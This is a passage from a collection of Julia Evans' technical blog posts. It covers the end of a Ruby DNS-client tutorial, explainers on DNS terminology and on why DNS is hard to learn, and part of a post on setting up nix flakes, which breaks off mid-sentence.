@header.num_answers  is 2. (which is maybe a\n little  bit of Ruby magic but I think it’s kind of fun and hopefully isn’t too hard\nto read) \n\n We can integrate this code into our main function like this: \n\n sock.send(make_dns_query(\"example.com\", 1), 0) # 1 is \"A\", for IP address\nreply, _ = sock.recvfrom(1024)\nresponse = DNSResponse.new(reply) # parse the response!!!\nputs response.answers[0]\n \n\n Printing out the records looks awful though (it says something like\n #<DNSRecord:0x00000001368e3118> ). So we need to write some pretty printing\ncode to make it human readable. \n\n step 13: pretty print our DNS records \n\n We need to add a  .to_s  field to DNS records to make them have a nice string\nrepresentation. This is just a 1-line method in  DNSRecord : \n\n   def to_s\n    \"#{@name}\\t\\t#{@ttl}\\t#{@type_name}\\t#{@parsed_rdata}\"\n  end\n \n\n You also might notice that I left out the  class  field of the DNS record. That’s because it’s\nalways the same (IN for “internet”) so I felt it was redundant. Most DNS tools\n(like real  dig ) will print out the class though. \n\n and we’re done! \n\n Here’s our final  main  function: \n\n def main\n  # connect to google dns\n  sock = UDPSocket.new\n  sock.bind('0.0.0.0', 0)\n  sock.connect('8.8.8.8', 53)\n\n  # send query\n  domain = ARGV[0]\n  sock.send(make_dns_query(domain, 1), 0)\n\n  # receive & parse response\n  reply, _ = sock.recvfrom(1024)\n  response = DNSResponse.new(reply)\n  response.answers.each do |record|\n    puts record\n  end\n \n\n I don’t think there’s too much to say about this – we connect, send a query,\nprint out each of the answers, and exit. Success! \n\n $ ruby dig.rb example.com\nexample.com   18608   A   93.184.216.34\n \n\n You can see the final program as a gist here:\n dig.rb . You could add more features to it if you want, like \n\n \n pretty printing for other query types \n options to print out the “authority” and “additional” sections of the DNS response \n retries \n making sure that the DNS response we see is  actually  a response to the query we sent (the query ID has to match! \n \n\n Also  you can let me know on Twitter  if I’ve made a mistake in this post somewhere\n– I wrote this pretty quickly so I probably got something wrong. \n\n"},
{"url": "https://jvns.ca/blog/2022/02/14/some-dns-terminology/", "title": "The multiple meanings of \"nameserver\" and \"DNS resolver\"", "content": "\n     \n\n I’m working on a zine about DNS right now, so I’ve been thinking about DNS\nterminology a lot more than a normal person. Here’s something slightly\nconfusing I’ve noticed about DNS terminology! \n\n Two of the most common DNS server terms (“nameserver” and “DNS resolver”)\nhave different meanings depending on the situation. \n\n Now this isn’t a problem if you already understand how DNS works – I can\neasily figure out what type of “nameserver” is being discussed based on\ncontext. \n\n But it can be a problem if you’re trying to learn how DNS works and you don’t\nrealize that those words might refer to different things depending on the\ncontext – it’s confusing! So I’m going to explain the different possible\nmeanings and how to figure out which meaning is intended. \n\n the 2 meanings of “nameserver” \n\n There are 2 types of nameservers, and which one the term “nameserver” means\ndepends on the context. \n\n Meaning 1: “authoritative” nameservers \n\n When you update the DNS records for a domain, those records are stored on a\nserver called an  authoritative nameserver . \n\n This is what “nameserver” means in the context of a  specific domain . Here are a few examples: \n\n \n “Connect a domain you already own to Wix by changing its  name servers .” \n “Almost all domains rely on multiple  nameservers  to increase reliability:\nif one nameserver goes down or is unavailable, DNS queries can go to\nanother one.” \n “You can update the  nameserver  records yourself by following the steps\nyour domain registrar may provide in the help content at their website” \n \n\n Meaning 2. “recursive” nameservers, also known as “DNS resolvers” \n\n These servers cache DNS records. Your browser doesn’t make a request to an\nauthoritative nameserver directly. Instead it makes a request to a DNS resolver (aka recursive nameserver)\nwhich figures out what the right authoritative nameserver to talk to is, gets\nthe record, and caches the result. \n\n This is what “nameserver” means in the context of  you browsing the internet .\n(“your computer’s nameservers”). Here are a few examples: \n\n \n “Changing  nameservers  can be a pain on some devices and require multiple\nclicks through a user interface. On Windows 10, for example…” \n “Are your DNS  nameservers  impeding your Internet experience? NEW RELEASE\nadds nameservers  1.1.1.1,  1.0.0.1  and  9.9.9.9” \n “Configure your network settings to use the IP addresses 8.8.8.8 and 8.8.4.4 as your DNS servers” \n \n\n I prefer to use the term “DNS resolver” even though it has 2 meanings because\nit’s much more commonly used than “recursive nameserver”. \n\n meanings of “DNS resolver” \n\n A DNS resolver can either be a library or a server. (I’m sorry, I know I said\nthat a DNS resolver is a server earlier. But sometimes it’s a library.) \n\n Meaning 1a: “stub resolver” (library version) \n\n A “stub resolver” is something (it can be either a library or a DNS server)\nwhich doesn’t know how to resolve DNS names itself, it’s just in charge of\nforwarding DNS queries to the “real” DNS resolver. Let’s talk about stub resolvers that are libraries first. \n\n For example, the  getaddrinfo  function from libc doesn’t know how to look up\nDNS records itself, it just knows to look in  /etc/resolv.conf  and forward the\nquery to whatever DNS server(s) it finds there. \n\n How you can tell if this is what’s meant: if it’s part of your computer’s\noperating system and/or if it’s a library, it’s a stub resolver. \n\n Examples of this meaning of “DNS resolver”: \n\n \n “The  resolver  is a set of routines in the C library that provide access to\nthe Internet Domain Name System (DNS)” \n “These are the DNS servers used to resolve web addresses. You can list up to\nthree, and the  resolver  tries each of them, one by one, until it finds one\nthat works.” \n “If the command succeeds, you will receive the following message “Successfully flushed the  DNS Resolver  Cache.“” \n \n\n Meaning 1b: “stub resolver” (server version) \n\n Stub resolvers aren’t always libraries though, like  systemd-resolved  and\n dnsmasq  are stub resolvers but they’re servers. Your router might be running\n dnsmasq . \n\n This is also known as a “DNS forwarder”. \n\n How you can tell if this is what’s meant: if your router is running it or it’s\npart of your OS, it’s probably a stub resolver. \n\n Meaning 2: a recursive nameserver (a server) \n\n A “recursive nameserver” (like we talked about before) is a server that knows\nhow to find the authoritative nameservers for a domain. This is the kind of DNS resolver I was talking about in this  A toy DNS resolver \npost a couple of weeks ago (though mine wasn’t a server). \n\n How to tell if this is what’s meant: if it’s  unbound ,  bind , 8.8.8.8,\n1.1.1.1, or run by your ISP, then it’s a recursive nameserver. \n\n Examples of this meaning of “DNS resolver”: \n\n \n “The DNS Resolver in pfSense® software utilizes unbound, which is a\nvalidating, recursive, caching  DNS resolver …” \n “We invite you to try Google Public DNS as your primary or secondary  DNS resolver …” \n “I work for a reasonably large mobile service provider and we are in the process of implementing our own  DNS resolver …” \n \n\n the most popular DNS server words \n\n I also did a quick unscientific survey of which terms to refer to DNS servers\nwere the most common by counting Google results. Here’s what I found: \n\n \n dns server: 8,000,000 \n nameserver: 4,200,000 \n dns resolver: 933,000 \n public DNS server: 204,000 \n root nameserver: 42,000 \n recursive resolver: 38,500 \n stub resolver: 26,100 \n authoritative nameserver: 17,000 \n dns resolution service: 9,450 \n TLD nameserver: 7,500 \n dns recursor: 5,300 \n recursive nameserver: 5,060 \n \n\n Basically what this tells me is that by a pretty big margin, the most popular\nwords used when talking about DNS serves are “nameserver”, and “DNS resolver”. \n\n The more specific terms like “recursive nameserver”, “authoritative\nnameserver”, and “stub resolver” are much less common. \n\n that’s all! \n\n I hope this helps some folks understand what these words mean! The terminology\nis a bit messier than I’d like, but it seems better to me to explain it than to\nuse less-ambiguous language that isn’t as commonly used in practice. \n\n"},
{"url": "https://jvns.ca/blog/2023/07/28/why-is-dns-still-hard-to-learn/", "title": "Why is DNS still hard to learn?", "content": "\n     \n\n I write a lot about technologies that I found hard to learn about. A\nwhile back my friend Sumana asked me an interesting question – why are these\nthings so hard to learn about? Why do they seem so mysterious? \n\n For example, take DNS. We’ve been using DNS since the  80s  (for more than 35 years!). It’s\nused in every website on the internet. And it’s pretty stable – in a lot of\nways, it works the exact same way it did 30 years ago. \n\n But it took me YEARS to figure out how to confidently debug DNS issues, and\nI’ve seen a lot of other programmers struggle with debugging DNS problems as\nwell. So what’s going on? \n\n Here are a couple of thoughts about why learning to troubleshoot DNS problems\nis hard. \n\n (I’m not going to explain DNS very much in this post, see  Implement DNS in a Weekend  or  my DNS blog posts  for more about how DNS works) \n\n it’s not because DNS is super hard \n\n When I finally learned how to troubleshoot DNS problems, my reaction was “what,\nthat was it???? that’s not that hard!“. I felt a little bit cheated! I could\nexplain to you everything that I found confusing about DNS in  a few hours . \n\n So – if DNS is not all that complicated, why did it take me so many years to\nfigure out how to troubleshoot pretty basic DNS issues (like “my domain doesn’t\nresolve even though I’ve set it up correctly” or “ dig  and my browser have\ndifferent DNS results, why?“)? \n\n And I wasn’t alone in finding DNS hard to learn! I’ve talked to a lot of\nsmart friends who are very experienced programmers about DNS of the years, and\nmany of them either: \n\n \n didn’t feel comfortable making simple DNS changes to their websites \n or were confused about basic facts about how DNS works (like that records are  pulled and not pushed ) \n or did understand DNS basics pretty well, but had the some of the same\nknowledge gaps that I’d struggled with (negative caching and the details of\nhow  dig  and your browser do DNS queries differently) \n \n\n So if we’re all struggling with the same things about DNS, what’s going on? Why\nis it so hard to learn for so many people? \n\n Here are some ideas. \n\n a lot of the system is hidden \n\n When you make a DNS request on your computer, the basic story is: \n\n \n your computer makes a request to a server called  resolver \n the resolver checks its cache, and makes requests to some other servers called  authoritative nameservers \n \n\n Here are some things you don’t see: \n\n \n the resolver’s  cache . What’s in there? \n which  library code  on your computer is making the DNS request (is it libc\n getaddrinfo ? if so, is it the getaddrinfo from glibc, or musl, or apple? is\nit your browser’s DNS code? is it a different custom DNS implementation?).\nAll of these options behave slightly differently and have different\nconfiguration, approaches to caching, available features, etc. For example musl DNS didn’t support TCP until  early 2023 . \n the  conversation  between the resolver and the authoritative nameservers. I\nthink a lot of DNS issues would be SO simple to understand if you could\nmagically get a trace of exactly which authoritative nameservers were\nqueried downstream during your request, and what they said. (like, what if\nyou could run  dig +debug google.com  and it gave you a bunch of extra\ndebugging information?) \n \n\n dealing with hidden systems \n\n A couple of ideas for how to deal with hidden systems \n\n \n just teaching people what the hidden systems are makes a huge difference. For\na long time I had no idea that my computer had many different DNS libraries\nthat were used in different situations and I was confused about this for\nliterally years. This is a big part of my approach. \n with  Mess With DNS  we tried out this “fishbowl”\napproach where it shows you some parts of the system (the conversation with\nthe resolver and the authoritative nameserver) that are normally hidden \n I feel like it would be extremely cool to extend DNS to include a “debugging\ninformation” section. (edit: it looks like this already exists! It’s called\n Extended DNS Errors ,\nor EDE, and tools are slowly adding support for it. \n \n\n Extended DNS Errors seem cool \n\n Extended DNS Errors are a new way for DNS servers to provide extra debugging information in DNS response. Here’s an example of what that looks like: \n\n $ dig @8.8.8.8 xjwudh.com\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 39830\n;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 512\n; EDE: 12 (NSEC Missing): (Invalid denial of existence of xjwudh.com/a)\n;; QUESTION SECTION:\n;xjwudh.com.\t\t\tIN\tA\n\n;; AUTHORITY SECTION:\ncom.\t\t\t900\tIN\tSOA\ta.gtld-servers.net. nstld.verisign-grs.com. 1690634120 1800 900 604800 86400\n\n;; Query time: 92 msec\n;; SERVER: 8.8.8.8#53(8.8.8.8) (UDP)\n;; WHEN: Sat Jul 29 08:35:45 EDT 2023\n;; MSG SIZE  rcvd: 161\n \n\n Here I’ve requested a nonexistent domain, and I got the extended error  EDE:\n12 (NSEC Missing): (Invalid denial of existence of xjwudh.com/a) . I’m not\nsure what that means (it’s some DNSSEC Thing), but it’s cool to see an extra\ndebug message like that. \n\n I did have to install a newer version of  dig  to get the above to work. \n\n confusing tools \n\n Even though a lot of DNS stuff is hidden, there are a lot of ways to figure out\nwhat’s going on by using  dig . \n\n For example, you can use  dig +norecurse  to figure out if a given DNS resolver\nhas a particular record in its cache.  8.8.8.8  seems to return a  SERVFAIL \nresponse if the response isn’t cached. \n\n here’s what that looks like for  google.com \n\n $ dig +norecurse  @8.8.8.8 google.com\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 11653\n;; flags: qr ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 512\n;; QUESTION SECTION:\n;google.com.\t\t\tIN\tA\n\n;; ANSWER SECTION:\ngoogle.com.\t\t21\tIN\tA\t172.217.4.206\n\n;; Query time: 57 msec\n;; SERVER: 8.8.8.8#53(8.8.8.8)\n;; WHEN: Fri Jul 28 10:50:45 EDT 2023\n;; MSG SIZE  rcvd: 55\n \n\n and for  homestarrunner.com : \n\n $ dig +norecurse  @8.8.8.8 homestarrunner.com\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 55777\n;; flags: qr ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 512\n;; QUESTION SECTION:\n;homestarrunner.com.\t\tIN\tA\n\n;; Query time: 52 msec\n;; SERVER: 8.8.8.8#53(8.8.8.8)\n;; WHEN: Fri Jul 28 10:51:01 EDT 2023\n;; MSG SIZE  rcvd: 47\n \n\n Here you can see we got a normal  NOERROR  response for  google.com  (which is\nin  8.8.8.8 ’s cache) but a  SERVFAIL  for  homestarrunner.com  (which isn’t).\nThis doesn’t mean there’s no DNS record  homestarrunner.com  (there is!), it’s\njust not cached). \n\n But this output is really confusing to read if you’re not used to it! Here are a few things that I think are weird about it: \n\n \n the headings are weird (there’s  ->>HEADER<<- ,  flags: ,  OPT PSEUDOSECTION: ,  QUESTION SECTION: ,  ANSWER SECTION: ) \n the spacing is weird (why is the no newline between  OPT PSEUDOSECTION  and  QUESTION SECTION ?) \n MSG SIZE  rcvd: 47  is weird (are there other fields in  MSG SIZE  other than  rcvd ? what are they?) \n it says that there’s 1 record in the ADDITIONAL section but doesn’t show it, you have to somehow magically know that the “OPT PSEUDOSECTION” record is actually in the additional section \n \n\n In general  dig ’s output has the feeling of a script someone wrote in an adhoc\nway that grew organically over time and not something that was intentionally\ndesigned. \n\n dealing with confusing tools \n\n some ideas for improving on confusing tools: \n\n \n explain the output . For example I wrote  how to use dig  explaining how  dig ’s\noutput works and how to configure it to give you a shorter output by default \n make new, more friendly tools . For example for DNS there’s\n dog  and  doggo  and  my dns lookup tool . I think these are really cool but\npersonally I don’t use them because sometimes I want to do something a little\nmore advanced (like using  +norecurse ) and as far as I can tell neither\n dog  nor  doggo  support  +norecurse . I’d rather use 1 tool for everything,\nso I stick to  dig . Replacing the breadth of functionality of  dig  is a\nhuge undertaking. \n make dig’s output a little more friendly . If I were better at C programming,\nI might try to write a  dig  pull request that adds a  +human  flag to dig\nthat formats the long form output in a more structured and readable way,\nmaybe something like this: \n \n\n $ dig +human +norecurse  @8.8.8.8 google.com \nHEADER:\n  opcode: QUERY\n  status: NOERROR\n  id: 11653\n  flags: qr ra\n  records: QUESTION: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1\n\nQUESTION SECTION:\n  google.com.\t\t\tIN\tA\n\nANSWER SECTION:\n  google.com.\t\t21\tIN\tA\t172.217.4.206\n  \nADDITIONAL SECTION:\n  EDNS: version: 0, flags:; udp: 512\n\nEXTRA INFO:\n  Time: Fri Jul 28 10:51:01 EDT 2023\n  Elapsed: 52 msec\n  Server: 8.8.8.8:53\n  Protocol: UDP\n  Response size: 47 bytes\n \n\n This makes the structure of the DNS response more clear – there’s the header, the\nquestion, the answer, and the additional section. \n\n And it’s not “dumbed down” or anything! It’s the exact same information, just\nformatted in a more structured way. My biggest frustration with alternative DNS\ntools that they often remove information in the name of clarity. And though\nthere’s definitely a place for those tools, I want to see all the information!\nI just want it to be presented clearly. \n\n We’ve learned a lot about how to design more user friendly command line tools\nin the last 40 years and I think it would be cool to apply some of that\nknowledge to some of our older crustier tools. \n\n dig +yaml \n\n One quick note on dig: newer versions of dig do have a  +yaml  output format\nwhich feels a little clearer to me, though it’s too verbose for my taste (a\npretty simple DNS response doesn’t fit on my screen) \n\n weird gotchas \n\n DNS has some weird stuff that’s relatively common to run into, but pretty hard\nto learn about if nobody tells you what’s going on. A few examples (there are more in  some ways DNS can break : \n\n \n negative caching! (which I talk about in  this talk ) It\ntook me probably 5 years to realize that I shouldn’t visit a domain that\ndoesn’t have a DNS record yet, because then the  nonexistence  of that\nrecord will be cached, and it gets cached for HOURS, and it’s really\nannoying. \n differences in  getaddrinfo  implementations: until  early 2023 ,  musl  didn’t support TCP DNS \n resolvers that ignore TTLs: if you set a TTL on your DNS records (like “5\nminutes”), some resolvers will ignore those TTLs completely and cache the\nrecords for longer, like maybe 24 hours instead \n if you configure nginx wrong ( like this ), it’ll cache DNS records forever. \n how  ndots  can make your Kubernetes DNS slow \n \n\n dealing with weird gotchas \n\n I don’t have as good answers here as I would like to, but knowledge about weird\ngotchas is extremely hard won (again, it took me years to figure out negative\ncaching!) and it feels very silly to me that people have to rediscover them for\nthemselves over and over and over again. \n\n A few ideas: \n\n \n It’s incredibly helpful when people call out gotchas when explaining a topic. For example (leaving\nDNS for a moment), Josh Comeau’s Flexbox intro explains this  minimum size gotcha \nwhich I ran into SO MANY times for several years before finally finding an\nexplanation of what was going on. \n I’d love to see more community collections of common gotchas. For bash,\n shellcheck  is an incredible collection of bash\ngotchas. \n \n\n One tricky thing about documenting DNS gotchas is that different people are\ngoing to run into different gotchas – if you’re just configuring DNS for your\npersonal domain once every 3 years, you’re probably going to run into different\ngotchas than someone who administrates DNS for a domain with heavy traffic. \n\n A couple of more quick reasons: \n\n infrequent exposure \n\n A lot of people only deal with DNS extremely infrequently. And of course if you\nonly touch DNS every 3 years it’s going to be harder to learn! \n\n I think cheat sheets (like “here are the steps to changing your nameservers”)\ncan really help with this. \n\n it’s hard to experiment with \n\n DNS can be scary to experiment with – you don’t want to mess up your domain.\nWe built  Mess With DNS  to make this one a little easier. \n\n that’s all for now \n\n I’d love to hear other thoughts about what makes DNS (or your favourite\nmysterious technology) hard to learn. \n\n"},
{"url": "https://jvns.ca/blog/2023/11/11/notes-on-nix-flakes/", "title": "Some notes on nix flakes", "content": "\n     \n\n I’ve been using nix for about  9 months now .\nFor all of that time I’ve been steadfastly ignoring flakes, but everyone keeps\nsaying that flakes are great and the best way to use nix, so I decided to try\nto figure out what the deal is with them. \n\n I found it very hard to find simple examples of flake files and I ran into a\nfew problems that were very confusing to me, so I wanted to write down some very\nbasic examples and some of the problems I ran into in case it’s helpful to\nsomeone else who’s getting started with flakes. \n\n First, let’s talk about what a flake is a little. \n\n \naddition from a couple months later: I still do not actually understand flakes,\nbut a couple of months after I wrote this post, Jade wrote\n Flakes aren’t real and cannot hurt you: a guide to using Nix flakes the non-flake way \nwhich I still haven’t fully processed but is the closest thing I’ve found to an\nexplanation of flakes that I can understand\n \n\n flakes are self-contained \n\n Every explanation I’ve found of flakes explains them in terms of other nix\nconcepts (“flakes simplify nix usability”, “flakes are processors of Nix\ncode”). Personally I really needed a way to think about flakes in terms of\nother non-nix things and someone made an analogy to Docker containers that\nreally helped me, so I’ve been thinking about flakes a little like Docker\ncontainer images. \n\n Here are some ways in which flakes are like Docker containers: \n\n \n you can install and compile any software you want in them \n you can use them as a dev environment (the flake sets up all your dependencies) \n you can share your flake with other people with a  flake.nix  file and\nthen they can build the software exactly the same way you built it (a little\nlike how you can share a  Dockerfile , though flakes are MUCH better at the\n“exactly the same way you built it” thing) \n \n\n flakes are also different from Docker containers in a LOT of ways: \n\n \n with a  Dockerfile , you’re not actually guaranteed to get the exact same\nresults as another user. With  flake.nix  and  flake.lock  you are. \n they run natively on Mac (you don’t need to use Linux / a Linux VM the way you do with Docker) \n different flakes can share dependencies very easily (you can technically share layers between Docker images, but flakes are MUCH better at this) \n flakes can depend on other flakes and pick and choose which parts they want to take from their dependencies \n flake.nix  files are programs in the nix programming language instead of mostly a bunch of shell commands \n the way they do isolation is completely different (nix uses  dynamic linker/rpath tricks  instead of filesystem overlays, and there are no cgroups or namespaces or VMs or anything with nix) \n \n\n Obviously this analogy breaks down pretty quickly (the list of differences is\nVERY long), but they do share the “you can share a dev environment with a\nsingle configuration file” design goal. \n\n nix has a lot of pre-compiled binaries \n\n To me one of the biggest advantages of nix is that I’m on a Mac and nix has a\nrepository with a lot of pre-compiled binaries of various packages for Mac. I\nmostly mention this because people always say that nix is good because it’s\n“declarative” or “reproducible” or “functional” or whatever but my main\nmotivation for using nix personally is that it has a lot of binary packages. I\ndo appreciate that it makes it easier for me to build a  5-year-old version of hugo on mac \nthough. \n\n My impression is that nix has more binary packages than Homebrew does, so\ninstalling things is faster and I don’t need to build as much from source. \n\n my goal: make a flake with every package I want installed on my system \n\n Previously I was using nix as a Homebrew replacement like this (which I talk about more in  this blog post ): \n\n \n run  nix-env -iA nixpkgs.whatever  to install stuff \n that’s it \n \n\n This worked great (except that it  randomly broke occasionally , but someone helped me\nfind a workaround for that so the random breaking wasn’t a big issue). \n\n I thought it might be fun to have a single  flake.nix  file where I could maintain a list\nof all the packages I wanted installed and then put all that stuff in a\ndirectory in my  PATH . This isn’t very well motivated: my previous setup was\ngenerally working just fine, but I have a long history of fiddling with my\ncomputer setup (Arch Linux ftw) and so I decided to have a Day Of Fiddling. \n\n I think the only practical advantages of flakes for me are: \n\n \n I could theoretically use the  flake.nix  file to set up a new computer more easily \n I can never remember how to  uninstall  software in nix, deleting a line in a configuration file is maybe easier to remember \n \n\n These are pretty minor though. \n\n how do we make a flake? \n\n Okay, so I want to make a flake with a bunch of packages installed in it, let’s say Ruby and cowsay to start. How do I\ndo that? I went to  zero-to-nix  and copied and pasted some things and ended up with this  flake.nix  file ( here it is in a gist ): \n\n {\n  inputs.nixpkgs.url = \"github:NixOS/nixpkgs/nixpkgs-23.05-darwin\";\n  outputs = { self, nixpkgs }: {\n    devShell.aarch64-darwin = nixpkgs.legacyPackages.aarch64-darwin.mkShell {\n      buildInputs = with nixpkgs.legacyPackages.aarch64-darwin; [\n        cowsay\n        ruby\n      ];\n    };\n  };\n}\n \n\n This has a little bit of boilerplate so let’s list the things I understand about this: \n\n \n nixpkgs  is a huge central repository of nix packages \n aarch64-darwin  is my machine’s architecture, this is important because I’m asking nix to download binaries \n I’ve been thinking of an “input” as a sort of dependency.  nixpkgs  is my one\ninput. I get to pick and choose which bits of it I want to bring into my\nflake though. \n the  github:NixOS/nixpkgs/nixpkgs-23.05-darwin  url scheme is a bit unusual:\nthe format is  github:USER/REPO_NAME/TAG_OR_BRANCH_NAME . So this is looking\nat the  nixpkgs-23.05-darwin  tag in the  NixOS/nixpkgs  repository. \n mkShell  is a nix function that’s apparently useful if you want to run  nix develop . I stopped using it after this so I don’t know more than that. \n devShell.aarch64-darwin  is the name of the output. Apparently I need to give it that exact name or else  nix develop  will yell at me \n cowsay  and  ruby  are the things I’m taking from nixpkgs to put in my output \n I don’t know what  self  is doing here or what  legacyPackages  is about \n \n\n Okay, cool.  Let’s try to build it: \n\n $ nix build\nerror: getting status of '/nix/store/w1v41cyqyx4d7q4g7c8nb50bp9dvjm29-source/flake.nix': No such file or directory\n \n\n This error is VERY mysterious – what is  /nix/store/w1v41cyqyx4d7q4g7c8nb50bp9dvjm29-source/  and why does nix think it should exist??? \n\n I was totally stuck until a very nice person on Mastodon helped me. So let’s talk about what’s going wrong here. \n\n problem 1: nix completely ignores untracked files \n\n Apparently nix flakes have some Weird Rules about git. The way it works is: \n\n \n if your current directory  isn’t  a git repo, everything is fine \n if your  are  in a git repository, and all your files have been  git add ed to git, everything is fine \n but if you’re in a git directory and your  flake.nix  file isn’t tracked by\ngit yet (because you just created it and are trying to get it to work), nix\nwill COMPLETELY IGNORE YOUR FILE \n \n\n After someone kindly told me what was happening, I found that this is\n mentioned in this blog post about flakes , which says: \n\n \n Note that any file that is not tracked by Git is invisible during Nix evaluation \n \n\n There’s also a  github issue  discussing what to do about this. \n\n So we need to  git add  the file to get nix to pay attention to it. Cool. Let’s keep going. \n\n a note on enabling the flake feature \n\n To get any of the commands we’re going to talk about to work (like  nix build ), you need to enable two nix features: \n\n \n flakes \n “commands” \n \n\n I set this up by putting  experimental-features = nix-command flakes   in my\n ~/.config/nix/nix.conf , but you can also run  nix --extra-experimental-features \"flakes nix-command\" build  instead of  nix build . \n\n time for  nix develop \n\n The instructions I was following told me that I could now run  nix develop  and get a shell inside my new environment. I tried it and it works: \n\n $ nix develop\ngrapefruit:nix bork$ cowsay hi\n ____\n< hi >\n ----\n        \\   ^__^\n         \\  (oo)\\_______\n            (__)\\       )\\/\\\n                ||----w |\n \n\n Cool! I was curious about how the PATH was set up inside this environment so I took a look: \n\n grapefruit:nix bork$ echo $PATH\n/nix/store/v5q1bxrqs6hkbsbrpwc81ccyyfpbl8wk-clang-wrapper-11.1.0/bin:/nix/store/x9jmvvxcys4zscff39cnpw0kyfvs80vp-clang-11.1.0/bin:/nix/store/3f1ii2y5fs1w7p0id9mkis0ffvhh1n8w-coreutils-9.1/bin:/nix/store/8ldvi6b3ahnph19vm1s0pyjqrq0qhkvi-cctools-binutils-darwin-wrapper-973.0.1/bin:/nix/store/5kbbxk18fp645r4agnn11bab8afm0ry3-cctools-binutils-darwin-973.0.1/bin:/nix/store/5si884h02nqx3dfcdm5irpf7caihl6f8-cowsay-3.7.0/bin:/nix/store/5bs5q2dw5bl7c4krcviga6yhdrqbvdq6-ruby-3.1.4/bin:/nix/store/3f1ii2y5fs1w7p0id9mkis0ffvhh1n8w-coreutils-9.1/bin\n \n\n It looks like every dependency has been added to the PATH separately: for example there’s\n /nix/store/5si884h02nqx3dfcdm5irpf7caihl6f8-cowsay-3.7.0/bin  for  cowsay  and\n /nix/store/5bs5q2dw5bl7c4krcviga6yhdrqbvdq6-ruby-3.1.4/bin  for  ruby . That’s\nfine but it’s not how I wanted my setup to work: I wanted a single directory of\nsymlinks that I could just put in my PATH in my normal shell. \n\n getting a directory  of symlinks with  buildEnv \n\n I asked in the Nix discord and someone told me I could use  buildEnv  to turn\nmy flake into a directory of symlinks. As far as I can tell it’s just a way to\ntake nix packages and copy their symlinks into another directory. \n\n After some fiddling, I ended up with this: ( here’s a gist ) \n\n {\n  inputs.nixpkgs.url = \"github:NixOS/nixpkgs/nixpkgs-23.05-darwin\";\n  outputs = { self, nixpkgs }: {\n    defaultPackage.aarch64-darwin = nixpkgs.legacyPackages.aarch64-darwin.buildEnv {\n      name = \"julia-stuff\";\n      paths = with nixpkgs.legacyPackages.aarch64-darwin; [\n        cowsay\n        ruby\n      ];\n      pathsToLink = [ \"/share/man\" \"/share/doc\" \"/bin\" \"/lib\" ];\n      extraOutputsToInstall = [ \"man\" \"doc\" ];\n    };\n  };\n}\n \n\n This put a bunch of symlinks in  result/bin : \n\n $ ls result/bin/\nbundle  bundler  cowsay  cowthink  erb  gem  irb  racc  rake  rbs  rdbg  rdoc  ri  ruby  typeprof\n \n\n Sweet! Now I have a thing I can theoretically put in my PATH – this  result  directory. Next I mostly just\nneeded to add every other package I wanted to install to this  flake.nix  file (I got the list\nfrom  nix-env -q ). \n\n next step: add all the packages \n\n I ran into a bunch of weird problems adding all the packges I already had\ninstalled to my nix, so let’s talk about them. \n\n problem 2: an unfree package \n\n I wanted to install a non-free package called  ngrok . Nix gave me 3 options for how I could do this. Option C seemed the most promising: \n\n        c) For `nix-env`, `nix-build`, `nix-shell` or any other Nix command you can add\n         { allowUnfree = true; }\n       to ~/.config/nixpkgs/config.nix.\n \n\n But adding  { allowUnfree = true}  to  ~/.config/nixpkgs/config.nix  didn’t do\nanything for some reason so instead I went with option A, which did seem to\nwork: \n\n             $ export NIXPKGS_ALLOW_UNFREE=1\n\n        Note: For `nix shell`, `nix build`, `nix develop` or any other Nix 2.4+\n        (Flake) command, `--impure` must be passed in order to read this\n        environment variable.\n \n\n problem 3: installing a flake from a relative path doesn’t work \n\n I made a couple of flakes for custom Nix packages I’d made (which I wrote about in  my first nix blog post , and I wanted to set them up like this\n(you can see the  full configuration here ): \n\n       hugoFlake.url = \"path:../hugo-0.40\";\n      paperjamFlake.url = \"path:../paperjam\";\n \n\n This worked fine the first time I ran  nix build , but when I reran  nix build \nagain later I got some totally inscrutable error. \n\n My workaround was just to run  rm flake.lock  everytime before running  nix\nbuild , which seemed to fix the problem. \n\n I don’t really understand what’s going on here but there’s a  very long github issue thread about it . \n\n problem 4 : “error while reading the response from the build hook” \n\n For a while, every time I ran  nix build , I got this error: \n\n $ nix build\nerror:\n       … while reading the response from the build hook\n\n       error: unexpected EOF reading a line\n \n\n I spent a lot of time poking at my  flake.nix  trying to guess at what I could\nhave gone wrong. \n\n A very nice person on Mastodon also helped me with this one and it turned out\nthat what I needed to do was find the  nix-daemon  process and kill it. I still\nhave no idea what happened here or what that error message means, I did upgrade\nnix at some point during this whole process so I guess the\nupgrade went wonky somehow. \n\n I don’t think this one is a common problem. \n\n problem 5: error with share/man symlink \n\n I wanted to install the  zulu  package for Java, but when I tried to add it to\nmy list of packages I got this error complaining about a broken symlink: \n\n $ nix build\nerror: builder for '/nix/store/4n9c4707iyiwwgi9b8qqx7mshzrvi27r-julia-dev.drv' failed with exit code 2;\n       last 1 log lines:\n       > error: not a directory: `/nix/store/2vc4kf5i28xcqhn501822aapn0srwsai-zulu-11.62.17/share/man'\n       For full logs, run 'nix log /nix/store/4n9c4707iyiwwgi9b8qqx7mshzrvi27r-julia-dev.drv'.\n$ ls /nix/store/2vc4kf5i28xcqhn501822aapn0srwsai-zulu-11.62.17/share/ -l\nlrwxr-xr-x 29 root 31 Dec  1969 man -> zulu-11.jdk/Contents/Home/man\n \n\n I think what’s going on here is that the  zulu  package in  nixpkgs-23.05  was\njust broken (looks like it’s since been  fixed  in the unstable version). \n\n I decided I didn’t feel like dealing with that and it turned out I already had\nJava installed another way outside nix, so I just removed  zulu  from my list\nand moved on. \n\n putting it in my PATH \n\n Now that I knew how to fix all of the weird problems I’d run into, I wrote a\nlittle shell script called  nix-symlink  to build my flake and symlink it to\nthe very unimaginitively named  ~/.nix-flake . The idea was that then I could\nput  ~/.nix-flake  in my  PATH  and have all my programs available. \n\n I think people usually use nix flakes in a per-project way instead of “a single\nglobal flake”, but 